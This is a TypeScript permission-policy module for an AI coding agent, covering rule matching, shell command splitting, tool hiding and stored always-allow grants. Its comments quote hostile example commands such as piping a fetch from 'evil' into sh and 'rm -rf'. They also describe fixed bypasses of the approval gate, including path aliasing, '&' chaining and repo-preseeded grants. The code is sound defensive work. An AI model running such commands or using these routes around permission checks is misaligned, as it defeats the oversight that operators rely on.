import * as fs from "node:fs";
import * as path from "node:path";
import { userConfigRoot } from "./settings.js";
import { canonicalToolKey } from "./tools/utils/official-names.js";
import { withFileLock } from "./utils/file-lock.js";

export interface PermissionPolicyConfig {
  allow?: string[];
  deny?: string[];
  ask?: string[];
}

export interface PermissionPolicy {
  allow: string[];
  deny: string[];
  ask: string[];
}
// Tool-name comparison goes through the shared resolver so permission rules,
// execution and tool visibility can never disagree about what a tool is called.
// (Previously a hand-maintained alias table lived here only — a rule could match
// a tool that execution then refused to find. See tools/utils/official-names.)
function canonicalToolName(value: string): string {
  return canonicalToolKey(value);
}
function urlRuleMatches(pattern: string, target: string): boolean {
  const mode = pattern.endsWith(":*") ? "boundary" : pattern.endsWith("*") ? "prefix" : "exact";
  const prefix =
    mode === "boundary" ? pattern.slice(0, -2) : mode === "prefix" ? pattern.slice(0, -1) : pattern;
  const absolute = /^[a-z][\w+.-]*:\/\//i.test(prefix);
  try {
    const actual = new URL(target);
    const expected = new URL(absolute ? prefix : `https://${prefix}`);
    if (expected.username || expected.password) return false;
    if (absolute && actual.protocol !== expected.protocol) return false;
    if (actual.hostname.replace(/\.$/, "") !== expected.hostname.replace(/\.$/, "")) return false;
    const authority = absolute ? (prefix.split("://")[1]?.split(/[/?#]/)[0] ?? "") : prefix;
    const explicitPort = /:(\d+)$/.exec(authority)?.[1];
    const actualPort =
      actual.port ||
      (actual.protocol === "https:" ? "443" : actual.protocol === "http:" ? "80" : "");
    if (explicitPort && Number(actualPort) !== Number(explicitPort)) return false;
    if (!absolute)
      return (
        mode === "boundary" &&
        expected.pathname === "/" &&
        !expected.search &&
        !expected.hash &&
        !prefix.endsWith(":")
      );
    if (
      mode === "exact" &&
      actualPort !==
        (expected.port ||
          (expected.protocol === "https:" ? "443" : expected.protocol === "http:" ? "80" : ""))
    )
      return false;
    const expectedPath = `${expected.pathname}${expected.search}${expected.hash}`;
    const actualPath = `${actual.pathname}${actual.search}${actual.hash}`;
    if (mode === "exact") return actualPath === expectedPath;
    if (mode === "prefix") return actualPath.startsWith(expectedPath);
    return (
      actualPath === expectedPath ||
      (actualPath.startsWith(expectedPath) &&
        (expectedPath.endsWith("/") || /[/?#]/.test(actualPath[expectedPath.length] ?? "")))
    );
  } catch {
    return false;
  }
}

/**
 * Fresh empty policy. Deliberately a FACTORY, not a shared `{...EMPTY}`
 * template: a spread copies the array REFERENCES, so every consumer would
 * push into the same module-level arrays — rules silently accumulating
 * across mergePermissionPolicies calls (found via the A3 trust-gate tests:
 * one test's allow rules leaked into the next policy built).
 */
function emptyPolicy(): PermissionPolicy {
  return { allow: [], deny: [], ask: [] };
}

function list(value: unknown): string[] {
  return Array.isArray(value)
    ? value.filter((x): x is string => typeof x === "string" && x.trim() !== "")
    : [];
}

export function parsePermissionPolicy(value: unknown): PermissionPolicy {
  if (!value || typeof value !== "object" || Array.isArray(value)) return emptyPolicy();
  const v = value as PermissionPolicyConfig;
  return { allow: list(v.allow), deny: list(v.deny), ask: list(v.ask) };
}

export function mergePermissionPolicies(...values: unknown[]): PermissionPolicy {
  const out: PermissionPolicy = emptyPolicy();
  for (const value of values) {
    const p = parsePermissionPolicy(value);
    out.allow.push(...p.allow);
    out.deny.push(...p.deny);
    out.ask.push(...p.ask);
  }
  return {
    allow: [...new Set(out.allow)],
    deny: [...new Set(out.deny)],
    ask: [...new Set(out.ask)],
  };
}

/**
 * Match official-style rules: `Bash`, `Bash(git *)`, `Bash(npm run:*)`, `*`.
 *
 * Review follow-up (既有问题 A): two silent-failure gaps closed —
 *  - Tool names compare CASE-INSENSITIVELY. Official-style rules are
 *    capitalized ("Bash", "Edit") while registry tool names are lowercase;
 *    the old strict === made every official-style deny rule a no-op.
 *  - The official colon-prefix form `Bash(npm run:*)` now matches commands
 *    starting with "npm run" at a WORD boundary (so `Bash(git:*)` does not
 *    also allow "github-cli …"). The old code compared against a literal
 *    "npm run:" prefix, which real commands never carry.
 * Trailing `*` inside the parens remains a plain prefix wildcard.
 */
/**
 * Normalize a file path for rule comparison.
 *
 * Review fix ("路径别名绕过 deny/ask"): rules used to compare the RAW
 * `input.filePath` string, so `deny: ["Read(secret.txt)"]` never matched an
 * identical `./secret.txt` or absolute-path call — the deny was silently
 * bypassed while the tool opened the very same file. Both sides now resolve
 * against the workspace root (falling back to cwd), with Windows
 * case-folding, so aliasing a path cannot dodge a rule.
 *
 * A TRAILING separator is preserved (self-review fix): path.resolve strips
 * it, and the wildcard/colon prefix branches rely on it as the component
 * boundary — without it `docs/*` normalized to `…\docs` and prefix-matched
 * `…\docs-secret\x` too (an allow-rule bypass; probe-verified).
 */
function normalizeRulePath(value: string, workspaceRoot?: string): string {
  const base = workspaceRoot ?? process.env.WORKSPACE_ROOT ?? process.cwd();
  const hadTrailingSep = /[\\/]$/.test(value);
  const resolved = path.resolve(base, value.replace(/\//g, path.sep));
  const normalized =
    hadTrailingSep && !resolved.endsWith(path.sep) ? resolved + path.sep : resolved;
  return process.platform === "win32" ? normalized.toLowerCase() : normalized;
}

export function permissionRuleMatches(
  rule: string,
  toolName: string,
  input: Record<string, unknown>,
  workspaceRoot?: string,
): boolean {
  // Official "Disable specific subagents": `Task(code-explorer)` /
  // `Agent(code-explorer)` rules match the requested sub-agent TYPE, which
  // lives in input.subagent_type (Agent tool) / input.subagent_name (task
  // tool), not in command/filePath/url.
  const agentType =
    typeof input.subagent_type === "string"
      ? input.subagent_type
      : typeof input.subagent_name === "string"
        ? input.subagent_name
        : undefined;
  const target =
    typeof input.command === "string"
      ? input.command
      : typeof input.filePath === "string"
        ? input.filePath
        : typeof input.url === "string"
          ? input.url
          : (agentType ?? "");
  const trimmed = rule.trim();
  if (trimmed === "*") return true;
  const name = canonicalToolName(toolName);
  // Split "Name(pattern)"; a rule without parens is a bare tool name.
  const m = /^([^(]*)\((.*)\)$/s.exec(trimmed);
  const ruleTool = (m ? m[1]! : trimmed).trim();
  if (!m) {
    if (ruleTool.endsWith("*")) return name.startsWith(canonicalToolName(ruleTool.slice(0, -1)));
    return canonicalToolName(ruleTool) === name;
  }
  if (canonicalToolName(ruleTool) !== name) return false;
  const pattern = m[2]!;
  if (pattern === "*") return true;
  // Sub-agent type names compare case-insensitively (registry names are
  // lowercase; a rule may write "Task(Explore)"). Every other target keeps
  // its case-sensitive semantics.
  const subagentRule = agentType !== undefined && target === agentType;
  const cmpPattern = subagentRule ? pattern.toLowerCase() : pattern;
  const cmpTarget = subagentRule ? target.toLowerCase() : target;
  if (typeof input.url === "string" && target === input.url) return urlRuleMatches(pattern, target);
  // Path rules compare RESOLVED paths (see normalizeRulePath) so `./x`, `x`
  // and absolute aliases of the same file all hit the same rule.
  const isFileRule =
    typeof input.command !== "string" && typeof input.filePath === "string" && !input.url;
  const norm = (value: string): string =>
    isFileRule ? normalizeRulePath(value, workspaceRoot) : value;
  // Official colon-prefix form: prefix match at a boundary. COMMAND rules
  // require a space after the prefix (`Bash(git:*)` must not also allow
  // "github-cli"). URL-shaped prefixes (scheme:// or a space-less token with
  // a dot, i.e. a host) additionally accept the hierarchical separators that
  // legitimately follow a host — "/", ":", "?", "#" — so `WebFetch(https://
  // evil.com:*)` matches "https://evil.com/x" instead of silently never
  // matching anything (fourth-round review).
  if (cmpPattern.endsWith(":*")) {
    const prefix = norm(cmpPattern.slice(0, -2));
    const effTarget = norm(cmpTarget);
    // Mirror the command form's "exact prefix matches" semantics for paths:
    // `Read(docs/:*)` covers the docs directory itself, not only its
    // children (path.resolve keeps no trailing separator on the target).
    const barePrefix =
      isFileRule && (prefix.endsWith("/") || prefix.endsWith(path.sep))
        ? prefix.slice(0, -1)
        : prefix;
    if (effTarget === prefix || (isFileRule && effTarget === barePrefix)) return true;
    const urlIsh =
      !isFileRule &&
      (prefix.includes("://") || (!prefix.includes(" ") && /\.[A-Za-z]/.test(prefix)));
    if (urlIsh && !prefix.includes("://")) {
      // Bare-host rule (`WebFetch(domain.com:*)`): the target carries a
      // scheme, so compare against the URL's host part instead of a plain
      // prefix (which would never match "https://domain.com/a").
      try {
        const url = new URL(target);
        const expected = new URL(`https://${prefix}`);
        if (
          expected.pathname !== "/" ||
          expected.search ||
          expected.hash ||
          expected.username ||
          expected.password ||
          prefix.endsWith(":")
        )
          return false;
        const explicitPort = /:(\d+)$/.exec(prefix)?.[1];
        const actualPort =
          url.port || (url.protocol === "https:" ? "443" : url.protocol === "http:" ? "80" : "");
        return (
          url.hostname.replace(/\.$/, "") === expected.hostname.replace(/\.$/, "") &&
          (!explicitPort || Number(actualPort) === Number(explicitPort))
        );
      } catch {
        return false;
      }
    }
    if (!effTarget.startsWith(prefix)) return false;
    if (prefix.endsWith(" ")) return true;
    const next = effTarget[prefix.length];
    if (prefix.includes("://")) return /[/:?#]/.test(next ?? "");
    // File rules (normalized absolute paths): the boundary is a path
    // separator, and a prefix that already ends with one has consumed it
    // (self-review fix — colon-form path rules like `Read(docs/:*)` used to
    // demand a space after the prefix and never matched anything).
    if (isFileRule) {
      if (prefix.endsWith("/") || prefix.endsWith(path.sep)) return true;
      return next === "/" || next === path.sep;
    }
    return next === " ";
  }
  // Trailing-star wildcard: plain prefix match (path rules on resolved paths).
  if (cmpPattern.endsWith("*")) return norm(cmpTarget).startsWith(norm(cmpPattern.slice(0, -1)));
  return norm(cmpTarget) === norm(cmpPattern);
}

/**
 * Split a shell command into its operator-separated segments (&&, ||, ;, |).
 * Returns single-element inputs unchanged for non-command tools. Splitting is
 * deliberately quote-blind: an over-split only ever causes a re-prompt (safe
 * direction), never a silent allow.
 *
 * Review fix ("裸 & / 换行漏分段"): `&` alone (bash background, cmd.exe
 * unconditional separator) and newlines were NOT split points, so
 * `git status & npm run build` was one segment and inherited a `Bash(git *)`
 * allow — while both real shells executed the second command. The separator
 * set now matches the read-only classifier's (utils/command.ts), which
 * already handled these. fd-dup redirections (`2>&1`, `<&2`, `&>`) are
 * shielded from the split first: they add no second command, and splitting
 * them would needlessly re-prompt very common invocations.
 */
const FD_REDIRECT_AND = /(\d*)([<>])&(\d+)|&>/g;
function commandSegments(input: Record<string, unknown>): Record<string, unknown>[] {
  if (typeof input.command !== "string") return [input];
  const shield = input.command.replace(FD_REDIRECT_AND, (match) => match.replace(/&/g, "\u0000"));
  const parts = shield
    .split(/\s*(?:&&|\|\||[|;&]|\r\n|\r|\n)\s*/)
    .map((s) => s.trim().replace(/\u0000/g, "&"))
    .filter((s) => s !== "");
  if (parts.length <= 1) return [input];
  return parts.map((command) => ({ ...input, command }));
}

export function policyDecision(
  policy: PermissionPolicy | undefined,
  toolName: string,
  input: Record<string, unknown>,
  workspaceRoot?: string,
): "allow" | "deny" | "ask" | undefined {
  if (!policy) return undefined;
  // Segment-aware evaluation (review fix): rules apply per command segment,
  // not to the whole command line. Deny/ask fire when ANY segment matches
  // (`echo ok && rm -rf x` must hit `Bash(rm *)`); allow fires only when EVERY
  // segment is covered (`Bash(git *)` must not auto-allow
  // `git status && curl evil | sh`).
  const segments = commandSegments(input);
  if (
    segments.some((seg) =>
      policy.deny.some((r) => permissionRuleMatches(r, toolName, seg, workspaceRoot)),
    )
  )
    return "deny";
  if (
    segments.some((seg) =>
      policy.ask.some((r) => permissionRuleMatches(r, toolName, seg, workspaceRoot)),
    )
  )
    return "ask";
  if (
    policy.allow.length > 0 &&
    segments.every((seg) =>
      policy.allow.some((r) => permissionRuleMatches(r, toolName, seg, workspaceRoot)),
    )
  )
    return "allow";
  return undefined;
}

/**
 * Does a deny rule hide the WHOLE tool, or only some of its calls?
 *
 * Only a bare tool name (`Bash`, `Edit`) or an explicit catch-all (`Bash(*)`,
 * `*`) removes the tool outright. A parameterized rule like `Bash(rm *)`
 * denies one shape of call, so the tool must stay visible — hiding it would
 * also take away `git status`, which the user never denied.
 */
function denyRuleHidesTool(rule: string, toolName: string): boolean {
  const trimmed = rule.trim();
  const name = canonicalToolName(toolName);
  if (trimmed === "*") return true;
  const m = /^([^(]*)\((.*)\)$/s.exec(trimmed);
  if (!m) {
    // Bare name, optionally with a trailing-star prefix wildcard.
    if (trimmed.endsWith("*")) return name.startsWith(canonicalToolName(trimmed.slice(0, -1)));
    return canonicalToolName(trimmed) === name;
  }
  if (canonicalToolName(m[1]!) !== name) return false;
  return m[2]!.trim() === "*";
}

/**
 * Should this tool be withheld from the model entirely?
 *
 * Deny rules gated EXECUTION only: the tool stayed in the request payload, so
 * the model kept seeing `bash`'s full schema and kept proposing calls that
 * were then refused. Hiding the tool is strictly better — the model stops
 * asking for a capability the operator removed.
 *
 * Deliberately NOT applied to `ask` rules (those must still be offered so the
 * user gets the prompt) and not to `allow` (additive, not restrictive).
 */
export function isToolHiddenByPolicy(
  policy: PermissionPolicy | undefined,
  toolName: string,
): boolean {
  if (!policy || policy.deny.length === 0) return false;
  return policy.deny.some((rule) => denyRuleHidesTool(rule, toolName));
}

/**
 * Default store for persistent "always allow" grants.
 *
 * Review fix ("仓库预置 permissions.json 绕过信任门"): the store used to live at
 * `<workspace>/.claude/permissions.json`. That file is repo-controlled — a
 * cloned project could preseed `bash::npm run build` next to a malicious
 * package.json script and the model's matching command would then skip the
 * approval prompt in EVERY mode. Grants are a USER decision, so the default
 * store moved to the user config dir, keyed per workspace; a repo cannot
 * preseed it. `CCR_PERMISSION_STORE` keeps the old flat-array format for
 * tests/sandboxes (it names a file the OPERATOR chose, not repo content).
 */
function storePath(): string {
  return process.env.CCR_PERMISSION_STORE || path.join(userConfigRoot(), "permissions.json");
}

function workspaceStoreKey(): string {
  const root = path.resolve(process.env.WORKSPACE_ROOT || process.cwd());
  return process.platform === "win32" ? root.toLowerCase() : root;
}

export function loadPersistentAlwaysAllow(): Set<string> {
  try {
    const parsed = JSON.parse(fs.readFileSync(storePath(), "utf8")) as unknown;
    if (Array.isArray(parsed)) {
      // Flat format: CCR_PERMISSION_STORE override (operator-chosen file).
      return new Set(parsed.filter((x): x is string => typeof x === "string"));
    }
    if (parsed && typeof parsed === "object") {
      // Default format: { [workspaceRoot]: string[] } — only THIS workspace's
      // grants load; another workspace's approvals never apply here.
      const scoped = (parsed as Record<string, unknown>)[workspaceStoreKey()];
      return new Set(
        Array.isArray(scoped) ? scoped.filter((x): x is string => typeof x === "string") : [],
      );
    }
    return new Set();
  } catch {
    return new Set([]);
  }
}

export function savePersistentAlwaysAllow(values: ReadonlySet<string>): void {
  try {
    const file = storePath();
    fs.mkdirSync(path.dirname(file), { recursive: true });
    if (process.env.CCR_PERMISSION_STORE) {
      fs.writeFileSync(file, JSON.stringify([...values].sort(), null, 2));
      return;
    }
    // The read-merge-write runs under the store's lock (self-review fix):
    // two processes saving DIFFERENT workspaces' grants concurrently used to
    // full-rewrite from their own read and drop the other's section.
    withFileLock(file, () => {
      // Preserve other workspaces' sections; replace only this workspace's.
      let all: Record<string, string[]> = {};
      try {
        const parsed = JSON.parse(fs.readFileSync(file, "utf8")) as unknown;
        if (parsed && typeof parsed === "object" && !Array.isArray(parsed))
          all = parsed as Record<string, string[]>;
      } catch {
        /* missing/corrupt store — start this workspace's section fresh */
      }
      all[workspaceStoreKey()] = [...values].sort();
      fs.writeFileSync(file, JSON.stringify(all, null, 2));
    });
  } catch {
    // Best effort; inability to persist must not block a permitted operation.
  }
}
